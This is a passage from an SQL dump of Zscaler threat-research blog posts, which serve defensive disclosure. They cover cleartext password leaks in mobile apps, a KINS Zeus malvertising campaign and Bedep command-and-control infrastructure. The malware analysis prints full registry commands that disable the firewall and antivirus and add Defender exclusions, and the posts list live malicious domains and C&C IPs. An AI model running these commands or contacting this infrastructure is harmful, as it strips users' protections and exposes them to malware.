Members!\",\"subtitle\":\"\",\"details\":\"\",\"version\":\"\",\"img\":\"http:\\/\\/img.shaadi.com\\/community\\/images\\/app\\/banner_accepted_free.png\"},\"banner_inbox_single\":{\"title\":\"1 Member like your profile!\",\"subtitle\":\"Become a Premium member & write back to them today\",\"details\":\"\",\"version\":\"\",\"img\":\"http:\\/\\/img.shaadi.com\\/community\\/images\\/app\\/banner_inbox_single_male_free_high.png\"},\"banner_inbox_multiple\":{\"title\":\"#count# Members like your profile!\",\"subtitle\":\"Become a Premium member & write back to them today\",\"details\":\"\",\"version\":\"\",\"img\":\"http:\\/\\/img.shaadi.com\\/community\\/images\\/app\\/banner_inbox_multiple_male_free_high.png\"}}}              Vulnerability in Android version         Account Registration         [-]http://www.shaadi.com/registration/user/?regmode=app&OS=native-android        Method: POST                   Host: www.shaadi.com                   User-Agent: Mozilla/5.0 (Linux; Android 5.0.2; Nexus 7 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Safari/537.36                   Request Body: form_referral_url=&form_url=http%3A%2F%2Fwww.shaadi.com%2Fregistration%2Fuser%3Fregmode%3Dapp%26os%3Dnative-android%26deviceid%3D--%7C--%26appver%3D4.1.3&form_name=MOB_DR_SEO_REG1&frompage=From+Reg+Page&go=&olmt_home_regpage=&hid_year=&oscode=1&email=vulapps%40zscaler.com&password1=p%40ssword1234&postedby=Self&first_name=fnzscaler&last_name=lnzscaler&gender=Male&day=10&month=10&year=1985&community=Spiritual+-+not+religious&mother_tongue=Marathi&countryofresidence=USA&contact_tel_number=Landline+No.          Login         [-]http://www.shaadi.com/registration/user/login-submit        Method: POST                   Host: www.shaadi.com                User-Agent: Mozilla/5.0 (Linux; Android 5.0.2; Nexus 7 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Safari/537.36                Request Body: go=&email=vulapps%40zscaler.com&password=p%40ssword123&autologin=0&autologin=Y         ZAP analysis:             	  		  			  		  		  			ZAP in action - Android  		  	        	  		  			  		  		  			ZAP in action - iOS  		  	    Conclusion    The list of mobile applications in Google Play and the iTunes App Store that send out sensitive information in cleartext continues to grow. Therefore, it is extremely important to keep separate passwords for different applications and never use the password of your financial applications anywhere else.    Credit: Lakshmi Devi.', 'Encryption;Mobile;Mobile Malware', 'https://www.zscaler.com/blogs/research/mobile-app-wall-shame-shaadicom');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (155, 'Malvertising Targeting European Transit Users', 'Chris Mannon', 'March 11, 2015', 'Malvertising has been an active and growing attack vector for delivering malicious payloads to unsuspecting users. ThreatLabZ recently uncovered a malvertising campaign targeting European transit users and the end payload appears to be downloading the KINS Zeus variant.    The KINS (Kasper Internet Non-Security) variant of Zeus is a banking Trojan that has been prevalent since 2011. KINS is a crimekit that was developed based off the leaked ZeuS source code to replace the aged Citadel Trojan which was used to harvest credentials from victim PCs.    ThreatLabZ has seen many instances of this threat being downloaded in the wild with very low AV detection.  The malicious dropper payload is downloaded from URLs that matches the following pattern:     [domain]:[nonstandard port]/[var1].php?[var2]=n&[var3]=n&[var4]=n&[var5]=n&[var6]=n&[var7]=n&[var8]=n  n = random [1-4]digit number        Some examples of this activity are seen below:      	rasaqsense[.]abbington[.]org:9090/full[.]php?refer=2010&reklama=4&star=860&site-map=171&blogs=78&click=2407&honda=2707  	razorssense[.]abbington[.]org:9090/full[.]php?back=1933&reklama=4&edit=2109&site-map=171&mail=366&page=6&virus=986  	brazil[.]telefonabrasil[.]com[.]br:8181/beta[.]php?corp=252&play=1249&popular=4&video=775&rssfeed=171&store=1416&deals=634  	abfronikl[.]mobi:20204/store[.]php?rates=2197&sendmail=4&ports=635&logout=171&other=1679&image=523&comp=2566  	panga[.]campanha[.]ga:8181/hardcore[.]php?best=1704&wink=205&humor=4&cover=2210&support=171&reply=1750&atom=1017  	sega[.]taxivega[.]kz:17340/music[.]php?macos=2433&rate=1041&game=4&nomic=1534&layout=171&humor=2699&usage=2115  	seww[.]istec[.]se:17340/music[.]php?media=432&page=2637&game=4&audit=833&layout=171&about=2332&cover=2361  	anarhism[.]temayang[.]tk:17340/music[.]php?event=2561&game=4&stars=2402&layout=171&warez=2596&intl=1014&story=2510  	clipsalinga[.]org:20204/store[.]php?intm=134&sendmail=4&front=1022&logout=171&tool=2554&radio=116&docs=1851  	clipsalinga[.]org:20204/store[.]php?linux=280&sendmail=4&best=361&logout=171&cert=1236&quote=118&math=2297    This variant of the KINS crimekit is spreading through malvertising attempts targeting European users. All the download attempts seen above have two things in common:      	Victims were visiting a site related to European transit  	Victims were redirected to the final destination through an advertising network                	  		  			  		  		  			Sample infection cycle URLs  		  	         The malware masquerades as a PDF document to lure an unsuspecting user into opening the file. Upon execution, it creates a copy of itself in the %Application Data% directory, deletes the original copy of itself and injects into the system explorer.exe process to perform variety of actions. The dropped file on the infected system can be found at one of the following two locations:      	%Application Data%\\svchoste.exe [Windows XP]  	%Application Data%\\Roaming\\[random 4-5 character string]\\[random 4-5 character string].exe  [Windows 7]      The bot further makes multiple system registry modifications to evade detection:    	Microsoft security center - disable update notifications, disable antimalware scan:        reg add HKLM\\SOFTWARE\\Microsoft\\Security Center /v UpdatesDisableNotify /t reg_dword /d 1 /f    reg add HKLM\\SOFTWARE\\Microsoft\\Security Center /v FirewallOverride /t reg_dword /d 1 /f    reg add HKLM\\SOFTWARE\\Microsoft\\Security Center /v FirewallDisableNotify /t reg_dword /d 1 /f    reg add HKLM\\SOFTWARE\\Microsoft\\Security Center /v AntiVirusOverride /t reg_dword /d 1 /f    reg add HKLM\\SOFTWARE\\Microsoft\\Security Center /v AntiVirusDisableNotify /t reg_dword /d 1 /f        	Windows firewall settings - Allow exceptions, disable notifications, disable the firewall:        reg add HKLM\\system\\currentcontrolset\\Services\\SharedAccess\\parameters\\firewallpolicy\\DomainProfile /v DisableNotifications /t reg_dword /d 1 /f    reg add HKLM\\system\\currentcontrolset\\Services\\SharedAccess\\parameters\\firewallpolicy\\DomainProfile /v DoNotAllowExceptions /t reg_dword /d 0 /f    reg add HKLM\\system\\currentcontrolset\\Services\\SharedAccess\\parameters\\firewallpolicy\\DomainProfile /v EnableFirewall /t reg_dword /d 0 /f    reg add HKLM\\system\\currentcontrolset\\Services\\SharedAccess\\parameters\\firewallpolicy\\publicprofile /v DisableNotifications /t reg_dword /d 1 /f    reg add HKLM\\system\\currentcontrolset\\Services\\SharedAccess\\parameters\\firewallpolicy\\standardprofile /v DisableNotifications /t reg_dword /d 1 /f    reg add HKLM\\system\\currentcontrolset\\Services\\SharedAccess\\parameters\\firewallpolicy\\publicprofile /v DoNotAllowExceptions /t reg_dword /d 0 /f    reg add HKLM\\system\\currentcontrolset\\Services\\SharedAccess\\parameters\\firewallpolicy\\standardprofile /v DoNotAllowExceptions /t reg_dword /d 0 /f    reg add HKLM\\system\\currentcontrolset\\Services\\SharedAccess\\parameters\\firewallpolicy\\publicprofile /v EnableFirewall /t reg_dword /d 0 /f    reg add HKLM\\system\\currentcontrolset\\Services\\SharedAccess\\parameters\\firewallpolicy\\standardprofile /v EnableFirewall /t reg_dword /d 0 /f        	Windows Defender & AntiMalware settings - Exclude malware processes, injected system processes and certain file types from scanning:        reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes  \" /v svchost.exe /t  REG_DWORD /d 0      reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes  \" /v consent.exe /t  REG_DWORD /d 0      reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes  \" /v rundll32.exe /t  REG_DWORD /d 0      reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes  \" /v spoolsv.exe /t  REG_DWORD /d 0      reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes  \" /v explorer.exe /t  REG_DWORD /d 0      reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes  \" /v rgjdu.exe /t  REG_DWORD /d 0      reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes  \" /v afwqs.exe /t  REG_DWORD /d 0      reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Extensions  \" /v *.tmp /t  REG_DWORD /d 0      reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Extensions  \" /v *.dll /t  REG_DWORD /d 0      reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Extensions  \" /v *.exe /t  REG_DWORD /d 0      reg add \"HKLM\\SOFTWARE\\Microsoft\\Microsoft Antimalware\\Exclusions\\Processes  \" /v svchost.exe /t  REG_DWORD /d 0      reg add \"HKLM\\SOFTWARE\\Microsoft\\Microsoft Antimalware\\Exclusions\\Processes  \" /v consent.exe /t  REG_DWORD /d 0      reg add \"HKLM\\SOFTWARE\\Microsoft\\Microsoft Antimalware\\Exclusions\\Processes  \" /v rundll32.exe /t  REG_DWORD /d 0      reg add \"HKLM\\SOFTWARE\\Microsoft\\Microsoft Antimalware\\Exclusions\\Processes  \" /v spoolsv.exe /t  REG_DWORD /d 0      reg add \"HKLM\\SOFTWARE\\Microsoft\\Microsoft Antimalware\\Exclusions\\Processes  \" /v explorer.exe /t  REG_DWORD /d 0      reg add \"HKLM\\SOFTWARE\\Microsoft\\Microsoft Antimalware\\Exclusions\\Processes  \" /v rgjdu.exe /t  REG_DWORD /d 0      reg add \"HKLM\\SOFTWARE\\Microsoft\\Microsoft Antimalware\\Exclusions\\Processes  \" /v afwqs.exe /t  REG_DWORD /d 0      reg add \"HKLM\\SOFTWARE\\Microsoft\\Microsoft Antimalware\\Exclusions\\Extensions  \" /v *.tmp /t  REG_DWORD /d 0      reg add \"HKLM\\SOFTWARE\\Microsoft\\Microsoft Antimalware\\Exclusions\\Extensions  \" /v *.dll /t  REG_DWORD /d 0      reg add \"HKLM\\SOFTWARE\\Microsoft\\Microsoft Antimalware\\Exclusions\\Extensions  \" /v *.exe /t  REG_DWORD /d 0    The injected code in the system explorer process is responsible for performing Command & Control (C&C) communication. It also opens up a port (TCP 36139) on the victim machine listening for incoming connections.       	  		  			  		  		  			Listening on TCP port 36139  		  	      There are two common network level indicators to identify a compromised node:    	A POST transaction with the following hard-coded User-Agent string          Mozilla/5.0 (Windows; Windows NT 7.1; en; rv:1.9.6.8) Gecko/20120122 Firefox/9.1.2         	A POST request made to a URI like \'/common/link.php\'.           	  		  			  		  		  			POST encrypted information to C&C server  		  	        The bot encrypts the system information in the following format and sends it via the above POST request to the C&C server:    v=%d&s=%d&h=%d&un=%s&o=%d&c=%d&ip=%s&sys=%s&uid=%d&w=%d&ftp=    The screenshot below shows the decrypted C&C location as well as a remote configuration file location for the bot:       	  		  			  		  		  			Decrypted C&C locations  		  	      Here are some of the C&C server IP addresses that were contacted by the compromised systems post infection:       	195.238.181.16  	190.14.37.150   	195.238.181.16  	185.25.119.84   	104.218.48.99   	192.3.24.150      Below is the C&C call back activity for the month of January and February, 2015 and the Geo-location of the C&C servers:                	  		  			  		  		  			C&C server location  		  	      Malvertising remains an effective exploit vector for threat actors to compromise victim systems.  The variation in payloads distributed through this tactic range from click-fraud botnet activity to highly effective crimeware, giving complete control of the infected systems to the remote attackers.', 'Advertising;Malware', 'https://www.zscaler.com/blogs/research/malvertising-targeting-european-transit-users');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (156, 'Mobile App Wall Of Shame: Quikr', 'Viral Gandhi', 'March 06, 2015', 'Quikr Local Classifieds\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Quikr app logo \r\n		\r\n	\r\n\r\n\r\nPrice : Free\r\n\r\nCategory : Lifestyle/Shopping\r\n\r\n\r\nPlatform : iOS and Android\r\nUpdated : February 12, 2015(Android), 22 January 2015(iOS) \r\n\r\nVersion : 7.42(Android), 2.8.2(iOS)\r\n\r\nSize : 3.89 MB(Android),10 MB(iOS)\r\n\r\nLanguage : English\r\n\r\nVendor : Quikr India\r\n\r\n \r\n\r\nBackground:\r\n\r\n\r\n \r\n\r\nQuikr is India\'s largest online and mobile classifieds portal. Like Craigslist, Quikr provides the users with a platform to help them buy, sell, rent and advertise across multiple categories like real estate, jobs, entertainment, education, matrimonial, etc. Quikr also has a mobile app on both the Android and iOS platforms. \r\n\r\nApplication Chart (information retrieved from Appannie & xyo.net)\r\n\r\n\r\n	\r\n		\r\n			\r\n			 \r\n			\r\n			\r\n			Android\r\n			\r\n			\r\n			iOS\r\n			\r\n		\r\n		\r\n			\r\n			Overall Ranking(India)\r\n			\r\n			\r\n			20\r\n			\r\n			\r\n			90\r\n			\r\n		\r\n		\r\n			\r\n			Category Ranking(India)\r\n			\r\n			\r\n			5 (Shopping)\r\n			\r\n			\r\n			8 (Lifestyle)\r\n			\r\n		\r\n		\r\n			\r\n			Total number of Downloads\r\n			\r\n			\r\n			12 Million\r\n			\r\n			\r\n			108 Thousand \r\n			\r\n		\r\n		\r\n			\r\n			Rating \r\n			\r\n			\r\n			4/5\r\n			\r\n			\r\n			3.5/5\r\n			\r\n		\r\n	\r\n\r\n\r\n\r\n \r\nA user is required to provide an email address and password when creating an account. After creating an account, the user can the post advertisements on Quikr. The application also provides functionality wherein different users can chat with each other.\r\n\r\n\r\n \r\n\r\n\r\nVulnerability - Clear text username/password\r\n\r\nThe current version of Quikr mobile application has a serious data leakage vulnerability. It has been verified that both the current Android and iOS versions of the application are sending username and password information via the HTTP protocol in cleartext. This security vulnerability allows an attacker on the same network to capture the credentials sent by a Quikr user to the application server and thus compromise the user\'s account which may lead to posting fake ads on account owner\'s behalf, selling and buying products and sending spam messages via chat to other users.\r\n \r\n\r\n\r\n\r\nThe flaw has been confirmed on versions 7.42 (latest versions available on Feb 12, 2015) on the Android platform and version 2.8 (latest version available on Jan 22, 2015) on the iOS platform. \r\n \r\n\r\n\r\n\r\n\r\nVulnerability in iOS version\r\n\r\nWhen a user tries to register for an account in the Quikr application, an HTTP request is generated as shown below. In this request, the userid, password and mobile number of the user are sent in cleartext. \r\n\r\n \r\n\r\nAccount Registration:\r\n\r\n \r\n\r\n[-]  Method: POST\r\n\r\nUrl: http://services.quikr.com/api?                 method=registerUser&secCode=fd1f2276c71627c35e2a9c5f8838c09c&version=1.5\r\n\r\n\r\nHost: services.quikr.com\r\n\r\nUser-Agent: Quikr/2.8.2 CFNetwork/711.1.16 Darwin/14.0.0\r\n\r\nRequest Body:cityId=23&userId=zscalerappscan%40zscaler.com&password=password123&mobile=9876543210&demail=969eac57dbfc4079a935fadf7ab261d6%40quikr.com\r\n\r\nServer Response: AJBiY , N , .E]n3 , i^0%] , 1}qa , K;\\OU4\r\n\r\n\r\n \r\n\r\n \r\n\r\nSimilarly, below is the traffic capture when an already existing user tries to login to their account. The userid and password are passed in cleartext.\r\n \r\n\r\nLogin:\r\n\r\n\r\n[-]  Method: POST\r\n\r\nUrl: http://services.quikr.com/api?method=login&secCode=fd1f2276c71627c35e2a9c5f8838c09c&version=1.5\r\n\r\n\r\nHost: services.quikr.com\r\n\r\nUser-Agent: Quikr/2.8.2 CFNetwork/711.1.16 Darwin/14.0.0\r\n\r\nRequest Body: demail=969eac57dbfc4079a935fadf7ab261d6@quikr.com&userId=zscalerappscan@zscaler.com&password=password123\r\n\r\nServer Response: 1`QaL , B*RD , , ,\r\n\r\n\r\n\r\nVulnerability in Android version\r\n\r\n \r\n\r\n\r\nWe will first test the Quikr application installed on a Google Nexus tablet. The Quikr application version available in the Google Play store for the tablet was v6.9. Below is the sample traffic capture when a user tries to register a new Quikr account or login to their existing Quikr account.\r\n\r\n\r\n \r\n\r\n\r\nAccount Registration:\r\n\r\n \r\n\r\n[-]  Method: POST\r\n\r\nUrl: http://services.quikr.com/api?method=registerUser&version=1.5&secCode=zXcv80386Mdp1hs0q7o0p9uiLZV37TdF&consumerVersion=7.42&density=2.0&demail=qaf4cd1713f1f62078magnumsnip@gmail.com\r\n\r\nHost: services.quikr.com\r\n\r\nUser-Agent: QuikrConsumer\r\n\r\nRequest Body: --s2retfgsGSRFsERFGHfgdfgw734yhFHW567TYHSrf4yarg , Content-Disposition: form-data; name=\"cityId\" , , 23 , --s2retfgsGSRFsERFGHfgdfgw734yhFHW567TYHSrf4yarg , Content-Disposition: form-data; name=\"demail\" , , qaf4cd1713f1f62078magnumsnip@gmail.com , --s2retfgsGSRFsERFGHfgdfgw734yhFHW567TYHSrf4yarg , Content-Disposition: form-data; name=\"mobile\" , , 8234567890 , --s2retfgsGSRFsERFGHfgdfgw734yhFHW567TYHSrf4yarg , Content-Disposition: form-data; name=\"userId\" , , appscan@zscaler.com , --s2retfgsGSRFsERFGHfgdfgw734yhFHW567TYHSrf4yarg , Content-Disposition: form-data; name=\"opf\" , , json , --s2retfgsGSRFsERFGHfgdfgw734yhFHW567TYHSrf4yarg , Content-Disposition: form-data; name=\"password\" , , p@ssword123\r\n\r\nServer Response: {\"login\":{\"auth\":1,\"code\":\"usercreated\",\"message\":[{\"direct\":\"New user created\"}],\"email\":\"appscan@zscaler.com\",\"mobile\":\"8234567890\",\"city\":\"23\",\"name\":\"\",\"UserSession\":\"PGR8fU59OHVzOWMhfFI+fll0Qj5mdnIjRXd0Rm57T0dZPXw\\/Q0RDYCE4amJ5L3R5PHVdTGpORSY6KDhjbl40LlliaztN\",\"emailCRC\":null,\"cityName\":\"Bangalore\",\"cityId\":\"23\",\"app_notif_status\":1,\"sound_preference\":1,\"notif_alarmtime\":\"08:00 PM\",\"userClassification\":null,\"isSharedPB\":0,\"isSharedFB\":0,\"userType\":1,\"numAlerts\":0,\"numAds\":\"0\"}}\r\n\r\n \r\n\r\n\r\nLogin:\r\n\r\n\r\n[-]  Method: POST\r\n\r\nUrl: http://services.quikr.com/api?method=login&version=1.5&secCode=zXcv80386Mdp1hs0q7o0p9uiLZV37TdF&consumerVersion=7.42&density=2.0&demail=qaf4cd1713f1f62078magnumsnip@gmail.com\r\n\r\nHost: services.quikr.com\r\n\r\nUser-Agent: QuikrConsumer\r\n\r\nRequest Body: --s2retfgsGSRFsERFGHfgdfgw734yhFHW567TYHSrf4yarg , Content-Disposition: form-data; name=\"demail\" , , qaf4cd1713f1f62078magnumsnip@gmail.com , --s2retfgsGSRFsERFGHfgdfgw734yhFHW567TYHSrf4yarg , Content-Disposition: form-data; name=\"userId\" , , appscan@zscaler.com , --s2retfgsGSRFsERFGHfgdfgw734yhFHW567TYHSrf4yarg , Content-Disposition: form-data; name=\"opf\" , , json , --s2retfgsGSRFsERFGHfgdfgw734yhFHW567TYHSrf4yarg , Content-Disposition: form-data; name=\"password\" , , password123\r\n\r\nServer Response: {\"login\":{\"auth\":1,\"code\":\"success\",\"message\":[{\"direct\":\"You are successfully logged in\"}],\"email\":\"appscan@zscaler.com\",\"mobile\":\"8234567890\",\"city\":\"23\",\"name\":\"\",\"UserSession\":\"PGR8fU59OHVzOWMhfFI+fll0Qj5mdnIjRXd0Rm57T0dZPXw\\/Q0RDYCE4amJ5L3R5PHVdTGpORSY6KDhjbl40LlliaztN\",\"emailCRC\":null,\"cityName\":\"Bangalore\",\"cityId\":\"23\",\"app_notif_status\":1,\"sound_preference\":1,\"notif_alarmtime\":\"08:00 PM\",\"userClassification\":\"0\",\"isSharedPB\":0,\"isSharedFB\":0,\"userType\":1,\"numAlerts\":0,\"numAds\":\"0\"}}\r\n\r\n \r\n\r\n\r\n\r\n\r\nAs you can see in the above requests, all communication between the mobile app and server is in sent via cleartext, which includes sensitive user information.\r\n\r\n \r\n\r\nZAP Analysis:\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			ZAP in action - Android\r\n		\r\n	\r\n\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			ZAP in action - iOS\r\n		\r\n	\r\n\r\nThis flaw was identified using the Zscaler Application Profiler (ZAP). ZAP is a free online tool that can be used to analyze mobile applications for vulnerabilities and privacy issues as seen in the above screenshots.\r\n\r\n\r\nConclusion:\r\n\r\nWe continue to find new popular applications in the Apple and Google app stores that are leaking device data and sending out sensitive user information in cleartext. This is a good argument for the use of one time passwords when establishing accounts on mobile apps. As a user, you can never know with certainly if your credentials are being transmitted/stored securely. By leveraging a password manager and ensuring that passwords are unique for all apps, at least you can be assured that if your credentials are compromised due to poor app security, only that specific account will be impacted.\r\n\r\n\r\nCredit: Lakshmi Devi.', 'Encryption;Mobile;Mobile Malware', 'https://www.zscaler.com/blogs/research/mobile-app-wall-shame-quikr');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (157, 'Mobile App Wall Of Shame: Tinychat For IPhone', 'Viral Gandhi', 'February 20, 2015', 'Tinychat     Price : Free    Category : Social Networking      Updated : December 29, 2014      Version : 5.0    Size : 19.41 MB    Language : English    Vendor : Tinychat Co    Operating system : iOS              Background:      Tinychat is a group video chat application that allows users to chat online and also create their own chart rooms. Currently, this application is ranked among the top 200 apps in the Social Networking category on the iTunes app store. Tinychat claims 5 million minutes of usage per day, making it one of the largest voice and video chat communities on the Internet today.    A user must submit their email address and password in order to create an account. Alternately, a user can also use their Facebook or Twitter account to login to this application.               Vulnerability - Clear text username/password           	  		  			  		  		  			App Login page  		  	      The current Tinychat App (verified on Version 5.0) has a serious information leakage flaw whereby username & password information for the Tinychat user is sent in clear text (unencrypted) to the application server. This vulnerability woud make it possible for an attacker to easily sniff network traffic and compromise the user account.              Below is the sample capture of a Tinychat user login attempt. As seen in the request, the username & password information is sent in clear text.                                  Login:      	  		  			  		  		  			Login Capture  		  	                Similarly, when a user attempts to register an account on Tinychat, the following HTTP request is generated. The username, password and email address information of the user passes in clear text as seen in the request below:    Account registration:             	  		  			  		  		  			Registration Capture  		  	      An attacker can easily takeover the victim\'s account by sniffing the vulnerable application\'s network traffic. This can further lead to more sophisticated attacks and can often lead to the compromise of other applications/services due to password reuse.              ZAP Analysis:         	  		  			  		  		  			ZAP in action.  		  	      This flaw was identified using Zscaler Application Profiler (ZAP). ZAP is a free online tool that can be used to analyze mobile applications for vulnerabilities and privacy issues as seen in the above screenshot. We have reached out to Tinychat developers, informing them of this security flaw.      Conclusion:      This type of security flaw can be uncovered by simply analyzing the network traffic sent by the application. It is disappointing to see such applications getting uploaded to Apple iTunes store without basic security tests like checking for clear text username/passwords being conducted. This is not the first time we have seen a popular iOS application with this security flaw, but Apple continues to ignore performing a basic security check as part of their vetting process for adding new applications to the app store.      Credit: Analysis by Lakshmi.', 'Encryption;Mobile;Mobile Malware', 'https://www.zscaler.com/blogs/research/mobile-app-wall-shame-tinychat-iphone');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (158, 'Ongoing Angler Exploit Kit And Bedep Fraud Campaign', 'ThreatLabz', 'February 11, 2015', 'In our recent post covering CVE-2015-0311, two of the Command and Control (C&C) domains used in the Domain Generation Algorithm (DGA), mapped back to the same Server IP address - 46.105.251.1. They were also using the same nameservers for resolution:    	ns1.regway.com  	ns2.regway.com    We took a closer look at the domains using these nameservers and found a distinct correlation between the C&C servers being used in this and other, possibly unrelated campaigns. In the past month, we\'ve tracked over 70 domains involved in malware C&C or other malicious activity involving Click Fraud & Ransomware campaigns. These domains were registered via \"Domain Context\" and use \"Regway.com\" nameservers for resolution.    To recap, we saw the initial binary was executed via the CVE-2015-0311 exploit, which then attempted resolution of multiple domains that were generated through a DGA:                Below is partial whois information for the two domains that resolved at that time:                      Taking a closer look at these domains, we noticed that they share some commonalities, specifically their nameservers and IPs:           	Comparison of C2 Domains  	  		  			Domain  			IP  			Observed Method  			Registrar  			Creation Date  			Contact  			Nameserver(s)  		  		  			gaabbezrezrhe1k.com  			46.105.251.1  			POST /  			domaincontext  			2015-01-19  			contact @privacyprotect.org  			ns1.regway.com, ns2.regway.com  		  		  			wzrdirqvrh07.com  			46.105.251.1  			POST /  			domaincontext  			2015-01-21  			yingw90 @yahoo.com  			ns1.regway.com, ns2.regway.com  		  	          Taking a look at other domains registered around that time via \"Domain Context\" by \'yingw90@yahoo.com\' and also utilizing \"regway.com\" for resolution, we find the following 39 domains:    aslfnsdifhsfdsa.com  avzxpjvrndi6g.com  bnxjgqotkqaftj.com  cavnplxhlwjzld.com  dtnvleoidsncuz7i.com  ggrdyqtlgdbpkkjf0e.com  gqzrdawmmvaalpevd0.com  grqtnsmqveprdc8f.com  jacafyfugdnvoov.com  jdioermutrealo.com  jxouhxclhzdlwa1d.com  jzkebkiznfttde.com  kdioqw873-kioas.com  koslnotreamouyer.com  krbewsoiitaciki2s.com  mcoihsopejaue.com  mlhxqydhcjqvei.com  nertafopadertam.com  noieutrabchpowewa.com  nwlxjqxstxclgngbw7.com  nyrtazolas.com  piragikolos.com  pndrdbgijushci.com  qhmbdzygdevxk0m.com  qvllupuqjknz5.com  roppsanaukpovtrwl.com  rwermezqpnf4.com  tuchrtwsabl7b.com  uowcvvknkrtipj.com  vsdylqjfrdqaxzyd.com  vucjunrhckgaiyae.com  vxmsrlsanrcilyb7o.com  vxuiweipowe92j.com  xgihfqovzurg8.com  xmoqu38hasdf0opw.com  xqirefjyjkcn7u.com  yoksfffhvizk8z.com  yyfaimjmocdu.com  zmbkfrdpnaec.com    Looking at the same time period for domains registered through \"Domain Context\", using \"Privacy Protect\", and using \"regway.com\" for resolution, we find an additional 32 domains, which also seem to fit the general theme of a DGA:    394iopwekmcopw.com  agdedopribili.com  asop83uyteramxop.com  balamodaevi.com  cawnqrvbmfgfysdb.com  deertraefople.com  gpsnypbnygqidxj.com  gurtgusinoi.com  gypqlkwgkmzapx33.com  iludyamdostaetsya.com  iqjlyjxplidpbbpuh.com  istinuskazat.com  itdlwcwonkhjrxlzuh.com  jddhbxrssjgqlsr.com  jyjhsvgkpeni0g.com  kbazarnomuondnu.com  kosnetsyanetolko.com  muzhikgusei.com  nabarishispeshil.com  neochenvezhlivo.com  predlinnoihvorostinoi.com  prodavatipravdu.com  retravopoytem.com  sokgtxioqzxvuksf1.com  tamgusyam.com  tuzlynlyvrbrdhrpx.com  vpsbxfdyphdykmlct.com  xnanomailing.com  yamuzhikainevenu.com  ytpliogapddu5.com  zhcjrjolbeuiylkyzx.com  zoidpyjhij36.com    The vast majority of these domains were resolving to Bedep\'s C&C servers. The following is a POST request to a C&C server from a Bedep infected system containing base64 encoded data:               However, some of the domains are being used in other seemingly unrelated malicious campaigns. For example the domain \'xmoqu38hasdf0opw.com\' was identifed by Kafeine as hosting a Reveton ransom page.     Other domains being used to monetize Bedep infections via click fraud include:    394iopwekmcopw.com/ads.php  394iopwekmcopw.com/r.php?key=41c7eed67784325bb935f2b6543ff37d  asop83uyteramxop.com/ads.php?sid=1910  asop83uyteramxop.com/r.php?key=c8a0293dce08d582ca645449d849543d  koslnotreamouyer.com/ads.php?sid=1905  koslnotreamouyer.com/r.php?key=666fe962677224b1799919a70c7c2c9e    And the following domains are intermediaries hosting encrypted files:    kosnetsyanetolko.com/slwsbpetw.eqmh  kdioqw873-kioas.com/asdfsfsdf1.php  nertafopadertam.com/2/showthread.php  nyrtazolas.com/1/search.php  piragikolos.com/asdfsfsdf1.php    Unfortunately, there are several different IPs in use on various ASNs:           	C2 IP Information  	  		  			IP  			Netblock  			ASN  		  		  			46.105.251.1  			46.105.0.0/16 OVH ISPOVH_65488197 OVH Static IP  			AS16276  		  		  			5.135.16.201  			5.135.0.0/16AS16276FR-OVH-20120706 OVH SAS  			AS16276  		  		  			94.23.204.16  			94.23.0.0/16 OVH ISPOVH OVH SAS Dedicated Servers  			AS16276  		  		  			5.196.196.149  			5.196.196.0/22AS197890FR-OVH-20120823 OVH SAS  			AS16276  		  		  			46.105.251.0  			46.105.0.0/16 OVH ISPOVH_65488197 OVH Static IP  			AS16276  		  		  			37.187.76.177  			37.187.0.0/16 OVHOVH OVH SAS Dedicated servers  			AS16276  		  		  			206.222.13.164  			206.222.0.0/19 RR-RC-Enet-ColumbusEE3-DOM  			AS10297  		  		  			23.105.135.219  			23.105.128.0/1923.104.0.0/13Route for Nobis Technology Group, LLCNETBLK-NOBIS-TECHNOLOGY-GROUP-18  			AS15003  		  		  			23.105.135.218  			23.105.128.0/1923.104.0.0/13Route for Nobis Technology Group, LLCNETBLK-NOBIS-TECHNOLOGY-GROUP-18  			AS15003  		  		  			151.80.95.8  			151.80.0.0/16151.80.0.0/17 OVHIUNET-BNET80 OVH SAS  			AS1267  		  		  			80.82.70.104  			80.82.70.0/24 AS29073 Route objectNL-ECATEL-20100816 Ecatel LTD  			AS29073  		  		  			79.143.82.203  			79.143.80.0/22Redstation LimitedRSDEDI-KBPNNOIL Dedicated Server Hosting  			AS35662  		  		  			79.143.80.42  			79.143.80.0/2279.143.80.0/24Proxy-registered route objectRSDEDI-IBOBAPEP Dedicated Server Hosting  			AS35662  		  		  			217.23.12.145  			217.23.0.0/20WORLDSTREAM-BLK-217-23-0-0WORLDSTREAM WorldStream IPv4.19  			AS49981  		  		  			173.224.126.29  			173.224.112.0/20Hosting Solutions InternationalHSI-3  			AS30083  		  		  			173.224.126.19  			173.224.112.0/20Hosting Solutions InternationalHSI-3  			AS30083  		  		  			50.30.36.1  			50.30.32.0/20Hosting Solutions InternationalHSI-4  			AS30083  		  		  			209.239.115.228  			209.239.112.0/20209.239.115.0/24Proxy-registered routeHSI-2  			AS30083  		  	           Conclusions  Attackers continue to move away from single IPs and small IP pools, preferring to distribute the infrastructure across multiple netblocks. This ensures their infrastructure is more resilient to blocks and takedown attempts allowing the attackers to continue to 